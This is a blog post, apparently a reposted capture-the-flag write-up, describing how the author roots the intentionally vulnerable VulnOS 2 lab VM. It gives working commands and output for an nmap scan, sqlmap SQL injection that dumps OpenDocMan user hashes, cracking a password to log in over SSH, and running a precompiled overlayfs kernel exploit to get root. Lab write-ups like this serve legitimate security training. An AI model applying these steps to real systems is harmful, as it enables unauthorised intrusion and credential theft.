---
layout: post
title: 黑技能测试：攻破VulnOS 2
---

VulnOS是人为打包的带漏洞的操作系统镜像，用来测试渗透技能。

[VulnOS](https://www.vulnhub.com/entry/vulnos-2,147/)是Virtualbox虚拟机镜像。

你的任务是获得这个系统的root权限。

VulnOS镜像下载地址：<http://download.vulnhub.com/vulnos/VulnOSv2.7z>

攻破步骤：<https://github.com/dqi/ctf_writeup/tree/master/boot2root/vulnos2>

Lets scan it:

>```
>_ nmap -sS -T4 -A 192.168.0.100 -p-
>
>Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-17 08:49 CEST
>Nmap scan report for 192.168.0.100
>Host is up (0.00064s latency).
>Not shown: 65532 closed ports
>PORT     STATE SERVICE VERSION
>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
>| ssh-hostkey:
>|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
>|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
>|_  256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
>80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
>|_http-server-header: Apache/2.4.7 (Ubuntu)
>|_http-title: VulnOSv2
>6667/tcp open  irc     ngircd
>MAC Address: 08:00:27:A1:E2:43 (Oracle VirtualBox virtual NIC)
>Device type: general purpose
>Running: Linux 3.X|4.X
>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
>OS details: Linux 3.2 - 4.4
>Network Distance: 1 hop
>Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
>>
>TRACEROUTE
>HOP RTT     ADDRESS
>1   0.64 ms 192.168.0.100
>
>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
>Nmap done: 1 IP address (1 host up) scanned in 80.84 seconds
>```

So there is ssh, a webserver and a IRC server.

On the webserver we get a link to /jabc, I spider this site, browse around a
bit, and find something interesting in /jabc/?q=node/8

>```
><p><span style="color:#000000">For security reasons, this section is hidden.</span></p>
><p><span style="color:#000000">For a detailed view and documentation of our products, please visit our documentation platform at /jabcd0cs/ on the server. Just login with guest/guest</span></p>
>```

We follow along to /jabcd0cs/

Here we find OpenDocMan 1.2.7, seeing the copyright for this version only goes
to 2013 I go to exploit db to see if there are any exploits.

>```
>https://www.exploit-db.com/exploits/32075/
>```

So there is SqL-injection possible in the add_value parameter, I fire sqlmap and
it and it gets some nice results.

>```
>sqlmap -u 'http://192.168.0.100/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user'
>-p add_value -D jabcd0cs --dump
>```

We get the hash for the webmin user.

>```
>Database: jabcd0cs
>Table: odm_user
>[3 entries]
>+----+--------------+--------------------+--------------+------------------------------------------+-----------+------------+------------+---------------+
>| id | phone        | Email              | username     | password                                 | last_name | first_name | department | pw_reset_code |
>+----+--------------+--------------------+--------------+------------------------------------------+-----------+------------+------------+---------------+
>| 1  | 5555551212   | webmin@example.com | webmin       | b78aae356709f8c31118ea613980954b         | min       | web        | 2          | <blank>       |
>| 2  | 555 5555555  | guest@example.com  | guest        | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest     | guest      | 2          | NULL          |
>| 3  | 555-555-0199 | winter@example.com | Peter+Winter | 3d5bfcc2c4c3101c754087120572aaf7         | Winter    | Peter      | 1          | NULL          |
>+----+--------------+--------------------+--------------+------------------------------------------+-----------+------------+------------+---------------+
>```

I paste this hash into the google and get back the plaintext.

>```
>result: webmin1980
>```

We can ssh in as this user.

>```
>ssh webmin@192.168.0.100                                                                                                                                                                                                 ⏎
>webmin@192.168.0.100's password:
>Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)
>
> * Documentation:  https://help.ubuntu.com/
>
>  System information as of Tue May 17 08:49:07 CEST 2016
>
>  System load: 0.0               Memory usage: 4%   Processes:       63
>  Usage of /:  5.7% of 29.91GB   Swap usage:   0%   Users logged in: 0
>
>  Graph this data and manage this system at:
>    https://landscape.canonical.com/
>
>Last login: Wed May  4 10:41:07 2016
>$ id
>uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
>```

I get a shell on the server and do some recon, after not finding anything for a
while I notice:

>```
>webmin@VulnOSv2:~$ uname -a
>Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
>```

I go to kernel-exploits to check if this kernel is vulnerable to anything, and
it is! There is even a precompiled exploit for us.

>```
>https://www.kernel-exploits.com/exploit/39/
>```

I copy it into webmins hope directory and...

>```
>webmin@VulnOSv2:~$ chmod +x ofs_32
>webmin@VulnOSv2:~$ ./ofs_32
>spawning threads
>mount #1
>mount #2
>child threads done
>/etc/ld.so.preload created
>creating shared library
># id
>uid=0(root) gid=0(root) groups=0(root),1001(webmin)
>```

Yay!

>```
># cat /root/flag.txt
>Hello and welcome.
>You successfully compromised the company "JABC" and the server completely !!
>Congratulations !!!
>Hope you enjoyed it.
>
>What do you think of A.I.?
>```

Good challenge, I liked exploring the sites looking for vulns, thanks to Vulnhub
for hosting and thanks to c4b3rw0lf for creating it!